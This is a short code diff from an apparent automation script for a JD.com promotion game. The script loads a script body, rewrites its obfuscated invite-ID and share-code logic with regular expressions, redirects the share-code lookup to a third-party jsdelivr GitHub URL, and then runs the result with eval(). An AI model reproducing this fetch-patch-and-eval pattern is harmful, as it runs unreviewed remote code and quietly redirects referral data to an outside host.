@@ -36,8 +36,11 @@ async function main() {
       'await submitInviteId($.UserName);',
       `await submitInviteId('jd_' + Buffer.from($.UserName.repeat(3)).toString('hex').slice(0, 13).toLowerCase());`
     ).replace(
-      /https?:\/\/.+?\/jxnc\.json/,
-      'https://cdn.jsdelivr.net/gh/Tersd07/test@main/nc.json'
+      /(?<=\(submitInviteId,)\$\[_0x\w+\([^)]+\)\](?=\))/,
+      `'jd_' + Buffer.from($&.repeat(3)).toString('hex').slice(0, 13).toLowerCase()`
+    ).replace(
+      /[`'"]https?:\/\/.+?\/jxnc\.json[`'"]|(?<=\+jxncShareCodeArr\[.+?try.+?let _0x\w+=\{'url':)_0x\w+?\([^)]+\)/,
+      '"https://cdn.jsdelivr.net/gh/Tersd07/test@main/nc.json"'
     );
     eval($.body);
   }
